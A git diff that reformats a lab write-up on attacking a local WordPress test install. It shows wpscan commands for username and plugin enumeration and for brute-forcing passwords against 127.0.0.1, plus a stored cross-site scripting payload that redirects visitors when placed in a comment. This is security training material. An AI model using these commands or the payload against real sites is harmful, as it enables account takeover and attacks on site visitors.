@@ -14,7 +14,8 @@ Time spent: **9** hours spent in total
 - [ ] GIF Walkthrough: 
     <img src="https://github.com/Tanya703/WordpressvsKali/blob/f9a78275c7e7b49ab38b30d820448d43e6120e7f/usernames.gif" width="800">
 - [ ] Steps to recreate: 
-wpscan --url http://127.0.0.1:8080 --api-token YOUR_TOKEN -e u vp 
+
+      wpscan --url http://127.0.0.1:8080 --api-token YOUR_TOKEN -e u vp 
 
   
 
@@ -27,7 +28,9 @@ wpscan --url http://127.0.0.1:8080 --api-token YOUR_TOKEN -e u vp
 <img src="https://github.com/Tanya703/WordpressvsKali/blob/6b33a6bd14b4ebfd52dbbeb7e084660c38448710/6yrqgi.gif" width="800">
 - [ ] Steps to recreate: 
 wpscan --url http://127.0.0.1:8080 --api-token YOUR_TOKEN --usernames username.txt --passwords password.txt
+
 username.txt → a file with usernames found from Username enumeration scan. 
+
 password.txt → a file with known passwords, use a sample size. 
 
     
@@ -39,7 +42,8 @@ password.txt → a file with known passwords, use a sample size.
 - [ ] GIF Walkthrough: 
  <img src="https://github.com/Tanya703/WordpressvsKali/blob/6b33a6bd14b4ebfd52dbbeb7e084660c38448710/Cross-SiteScripting.gif" width="800">
 - [ ] Steps to recreate: 
-<body onload=window.location='https://codepath.org/'> in comment section
+
+insert "<body onload=window.location='https://codepath.org/'>" in comment section
 
 
     
